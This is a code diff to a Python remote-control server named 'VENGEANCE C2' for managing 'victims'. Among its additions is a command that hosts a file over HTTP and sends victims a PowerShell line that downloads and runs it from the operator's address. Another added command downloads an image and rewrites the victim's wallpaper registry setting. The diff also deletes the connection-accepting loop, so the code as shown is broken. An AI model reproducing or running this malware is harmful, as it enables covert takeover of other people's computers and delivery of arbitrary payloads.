@@ -3,6 +3,9 @@ import threading
 import time
 import sys
 import os
+import http.server
+import socketserver
+from pathlib import Path
 
 HOST = '0.0.0.0'
 PORT = 4444
@@ -35,12 +38,12 @@ def print_banner():
      ░                                               ░               
     """
     print("\033[91m" + banner + "\033[0m")
-    type_effect("                  [ VENGEANCE C2 v1.0 ] - Control Panel", 0.03)
+    type_effect("                  [ VENGEANCE C2 v1.2 ] - Control Panel", 0.03)
 
 def list_victims():
     with lock:
         if not clients:
-            print("\033[93mNo victims connected yet.\033[0m")
+            print("\033[93mNo victims connected.\033[0m")
             return None
         print("\n\033[92m=== CONNECTED VICTIMS ===\033[0m")
         for i, (sock, name) in enumerate(clients.items(), 1):
@@ -48,35 +51,47 @@ def list_victims():
         print("\033[92m=========================\033[0m")
         return list(clients.keys())
 
-def handle_client(client_socket, addr):
+def send_file_and_run(victim_socket, filepath):
+    path = Path(filepath)
+    if not path.exists():
+        print(f"\033[91mFile not found: {filepath}\033[0m")
+        return
+    
+    filename = path.name
+    folder = path.parent
+    
     try:
-        data = client_socket.recv(1024).decode('utf-8', errors='ignore')
-        name = data.split("|")[1] if "connected|" in data else f"{addr[0]}"
+        # Temporarily change directory to where the file is
+        original_dir = os.getcwd()
+        os.chdir(folder)
+        
+        handler = http.server.SimpleHTTPRequestHandler
+        with socketserver.TCPServer(("", 8080), handler) as httpd:
+            print(f"\033[93mHosting {filename} on http://192.168.4.123:8080 ...\033[0m")
+            
+            cmd = f'powershell -c "Invoke-WebRequest -Uri \'http://192.168.4.123:8080/{filename}\' -OutFile \'$env:TEMP\\{filename}\'; Start-Process \'$env:TEMP\\{filename}\'"'
+            
+            victim_socket.sendall(cmd.encode('utf-8'))
+            print(f"\033[92m[+] Successfully sent and executed: {filename}\033[0m")
+            
+            time.sleep(4)  # Give time to download
+            
+        os.chdir(original_dir)  # Go back to original folder
+        
+    except Exception as e:
+        print(f"\033[91mFailed to send file: {e}\033[0m")
+        os.chdir(original_dir)
 
-        with lock:
-            clients[client_socket] = name
-
-        print(f"\n\033[92m[+] VENGEANCE ACQUIRED → {name} ({addr[0]})\033[0m")
-    except:
-        pass
-
-def start_server():
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server.bind((HOST, PORT))
-    server.listen(20)
-
-    print("\033[92m[+] VENGEANCE C2 Server Started\033[0m")
-    while True:
-        client_socket, addr = server.accept()
-        threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()
+def change_wallpaper(victim_socket, image_url):
+    cmd = f'powershell -c "Invoke-WebRequest -Uri \'{image_url}\' -OutFile \'$env:TEMP\\vengeance.jpg\'; reg add \\"HKCU\\Control Panel\\Desktop\\" /v Wallpaper /t REG_SZ /d \\"%TEMP%\\vengeance.jpg\\" /f; rundll32.exe user32.dll,UpdatePerUserSystemParameters"'
+    victim_socket.sendall(cmd.encode('utf-8'))
+    print("\033[92m[+] Wallpaper change sent!\033[0m")
 
 def victim_shell(victim_socket, victim_name):
     clear()
     print(f"\033[91m=== VENGEANCE SHELL → {victim_name} ===\033[0m")
-    type_effect("You now have full control. Commands execute silently on their PC.", 0.02)
-    print("Type '\033[93mback\033[0m' to return\n")
-
+    print("Special commands: send <file_or_path>, wallpaper <url>, back\n")
+    
     while True:
         try:
             shell_cmd = input(f"\033[96m{victim_name}\033[0m $> ").strip()
@@ -86,6 +101,20 @@ def victim_shell(victim_socket, victim_name):
             if not shell_cmd:
                 continue
 
+            if shell_cmd.startswith('send '):
+                filepath = shell_cmd[5:].strip()
+                send_file_and_run(victim_socket, filepath)
+                continue
+
+            if shell_cmd.startswith('wallpaper '):
+                url = shell_cmd[10:].strip()
+                if url.startswith('http'):
+                    change_wallpaper(victim_socket, url)
+                else:
+                    print("Usage: wallpaper https://example.com/image.jpg")
+                continue
+
+            # Normal command
             victim_socket.sendall(shell_cmd.encode('utf-8'))
 
             output = ""
@@ -101,6 +130,14 @@ def victim_shell(victim_socket, victim_name):
             print("\033[91mConnection lost.\033[0m")
             return
 
+# Server and main menu (same as before)
+def start_server():
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server.bind((HOST, PORT))
+    server.listen(20)
+    print("\033[92m[+] VENGEANCE C2 Started on port 4444\033[0m")
+
 def main_menu():
     while True:
         try:
@@ -109,24 +146,14 @@ def main_menu():
             if cmd in ['list', 'victims']:
                 list_victims()
                 continue
-
             if cmd in ['clear', 'cls']:
                 print_banner()
                 continue
-
             if cmd in ['help', '?']:
-                print("""\033[93m
-Available Commands:
-  list / victims     → Show all connected targets
-  [number]           → Enter shell (type 1, 2, 3...)
-  clear / cls        → Clear screen
-  help               → This menu
-  exit / quit        → Shutdown C2
-\033[0m""")
+                print("\033[93mType a number to select victim. Inside shell: send <file>, wallpaper <url>\033[0m")
                 continue
-
             if cmd in ['exit', 'quit']:
-                print("\033[91m[!] Shutting down VENGEANCE...\033[0m")
+                print("\033[91mShutting down...\033[0m")
                 sys.exit(0)
 
             if cmd.isdigit():
@@ -139,22 +166,14 @@ Available Commands:
                             victim_name = clients[victim_socket]
                             victim_shell(victim_socket, victim_name)
                             print_banner()
-                        else:
-                            print("\033[91mInvalid number.\033[0m")
                 except:
-                    print("\033[91mError.\033[0m")
-                continue
-
-            if cmd:
-                print("\033[93mType 'help' for commands.\033[0m")
-
-        except KeyboardInterrupt:
-            print("\n\033[91m[!] Shutting down...\033[0m")
-            sys.exit(0)
+                    pass
+        except:
+            pass
 
 if __name__ == "__main__":
     print_banner()
     threading.Thread(target=start_server, daemon=True).start()
     time.sleep(1)
-    print("\033[93mType 'help' to see commands.\033[0m")
+    print("\033[93mType 'help' for info\033[0m")
     main_menu()
